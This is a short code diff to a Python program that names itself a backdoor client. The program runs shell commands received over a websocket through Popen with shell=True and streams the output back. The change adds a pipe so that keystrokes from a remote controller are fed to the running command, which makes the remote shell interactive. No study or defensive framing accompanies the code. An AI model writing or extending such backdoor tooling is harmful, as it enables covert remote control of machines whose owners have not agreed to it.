@@ -72,8 +72,11 @@ class BackdoorClient(threading.Thread):
 
                     elif 'char' in msg:
                         char = get_char(msg)
-                        sys.stdin.write(char)       # todo
-                        sys.stdin.flush()
+
+                        if len(BackdoorClient.consoles) > 0:
+                            con = BackdoorClient.consoles[0]
+                            con.write_pipe.write(char)
+                            con.write_pipe.flush()
 
                 self.ws.close()
 
@@ -145,6 +148,10 @@ class Cmd(threading.Thread):
     def __init__(self, client, to_controler):
         threading.Thread.__init__(self)
 
+        r, w = os.pipe()
+        self.read_pipe = os.fdopen(r, 'r')
+        self.write_pipe = os.fdopen(w, 'w')
+
         self.send_data = client.send_data
         self.send_char = client.send_char
         self.send_end = client.send_end
@@ -168,7 +175,7 @@ class Cmd(threading.Thread):
                     self.send_end(self.to_controler)
                     continue
 
-                proc = Popen(cmd_input, shell=True, stdout=PIPE, stderr=PIPE, stdin=sys.stdin)
+                proc = Popen(cmd_input, shell=True, stdout=PIPE, stderr=PIPE, stdin=self.read_pipe)
 
                 char = proc.stdout.read(1)
                 self.buf_sender.buf += char
